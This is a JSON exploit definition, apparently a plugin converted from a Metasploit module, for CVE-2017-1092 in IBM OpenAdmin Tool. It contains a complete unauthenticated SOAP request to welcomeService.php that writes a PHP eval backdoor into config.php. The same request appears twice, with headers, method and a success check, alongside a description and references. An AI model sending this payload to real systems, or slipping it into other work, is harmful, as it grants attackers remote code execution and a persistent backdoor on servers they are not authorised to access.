{
   "requests" : {
      "EXPLOIT2" : {
         "VALIDATION" : {
            "TCODE" : [
               "200"
            ]
         },
         "HEADERS" : {
            "SOAPAction" : "urn:QBEAction",
            "Content-Type" : "text/xml; charset=UTF-8"
         },
         "PAYLOAD" : "<soapenv:Envelope xmlns:soapenv='http://schemas.xmlsoap.org/soap/envelope/' xmlns:urn='urn:Welcome' xmlns:xsd='http://www.w3.org/2001/XMLSchema' xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'><soapenv:Header/><soapenv:Body><urn:saveHomePage soapenv:encodingStyle='http://schemas.xmlsoap.org/soap/encoding/'><new_home_page xsi:type='xsd:string'>&quot;;eval(\\$_POST[&apos;TgqDpQMqWs&apos;]); #</new_home_page></urn:saveHomePage></soapenv:Body></soapenv:Envelope>",
         "TEXT" : "Sending Exploit #2 Request : [POST] /services/welcome/welcomeService.php",
         "METHOD" : "POST",
         "PATH" : "services/welcome/welcomeService.php"
      }
   },
   "detection" : {},
   "informations" : {
      "PATHS" : [
         "openadmin"
      ],
      "REFERENCES" : [
         "https://www-01.ibm.com/support/docview.wss?uid=swg22002897",
         "https://blogs.securiteam.com/index.php/archives/3210",
         "http://seclists.org/fulldisclosure/2017/May/105"
      ],
      "PLATFORM" : "MULTI",
      "TYPE" : "MSF",
      "CVE" : "CVE-2017-1092",
      "TITLE" : "IBM OpenAdmin Tool SOAP welcomeServer PHP Code Execution",
      "DESCRIPTION" : "\n\n        This module exploits an unauthenticated remote PHP code execution\n\n        vulnerability in IBM OpenAdmin Tool included with IBM Informix\n\n        versions 11.5, 11.7, and 12.1.\n\n\n\n        The 'welcomeServer' SOAP service does not properly validate user input\n\n        in the 'new_home_page' parameter of the 'saveHomePage' method allowing\n\n        arbitrary PHP code to be written to the config.php file. The config.php\n\n        file is executed in most pages within the application, and accessible\n\n        directly via the web root, resulting in code execution.\n\n\n\n        This module has been tested successfully on IBM OpenAdmin Tool 3.14\n\n        on Informix 12.10 Developer Edition (SUSE Linux 11) virtual appliance.\n\n      ",
      "name" : "IbmOpenadminToolSoapWelcomeserverExec",
      "REQUESTS" : {
         "EXPLOIT2" : {
            "VALIDATION" : {
               "TCODE" : [
                  "200"
               ]
            },
            "HEADERS" : {
               "SOAPAction" : "urn:QBEAction",
               "Content-Type" : "text/xml; charset=UTF-8"
            },
            "PAYLOAD" : "<soapenv:Envelope xmlns:soapenv='http://schemas.xmlsoap.org/soap/envelope/' xmlns:urn='urn:Welcome' xmlns:xsd='http://www.w3.org/2001/XMLSchema' xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'><soapenv:Header/><soapenv:Body><urn:saveHomePage soapenv:encodingStyle='http://schemas.xmlsoap.org/soap/encoding/'><new_home_page xsi:type='xsd:string'>&quot;;eval(\\$_POST[&apos;TgqDpQMqWs&apos;]); #</new_home_page></urn:saveHomePage></soapenv:Body></soapenv:Envelope>",
            "TEXT" : "Sending Exploit #2 Request : [POST] /services/welcome/welcomeService.php",
            "METHOD" : "POST",
            "PATH" : "services/welcome/welcomeService.php"
         }
      },
      "VARIABLES" : {
         "PATH" : {
            "VALUE" : "/openadmin",
            "DESCRIPTION" : "The base path to IBM OpenAdmin Tool"
         }
      },
      "MSF_MODULE" : "ibm_openadmin_tool_soap_welcomeserver_exec"
   },
   "paths" : [
      "openadmin"
   ],
   "cve" : "CVE-2017-1092",
   "name" : "IbmOpenadminToolSoapWelcomeserverExec",
   "msf_module" : "ibm_openadmin_tool_soap_welcomeserver_exec",
   "references" : [
      "https://www-01.ibm.com/support/docview.wss?uid=swg22002897",
      "https://blogs.securiteam.com/index.php/archives/3210",
      "http://seclists.org/fulldisclosure/2017/May/105"
   ],
   "title" : "IBM OpenAdmin Tool SOAP welcomeServer PHP Code Execution",
   "variables" : {
      "PATH" : {
         "VALUE" : "/openadmin",
         "DESCRIPTION" : "The base path to IBM OpenAdmin Tool"
      }
   },
   "platform" : "MULTI",
   "type" : "MSF",
   "description" : "\n\n        This module exploits an unauthenticated remote PHP code execution\n\n        vulnerability in IBM OpenAdmin Tool included with IBM Informix\n\n        versions 11.5, 11.7, and 12.1.\n\n\n\n        The 'welcomeServer' SOAP service does not properly validate user input\n\n        in the 'new_home_page' parameter of the 'saveHomePage' method allowing\n\n        arbitrary PHP code to be written to the config.php file. The config.php\n\n        file is executed in most pages within the application, and accessible\n\n        directly via the web root, resulting in code execution.\n\n\n\n        This module has been tested successfully on IBM OpenAdmin Tool 3.14\n\n        on Informix 12.10 Developer Edition (SUSE Linux 11) virtual appliance.\n\n      ",
   "plugins_directory" : "/home/evil/GIT/Exploits/../data/plugins/"
}
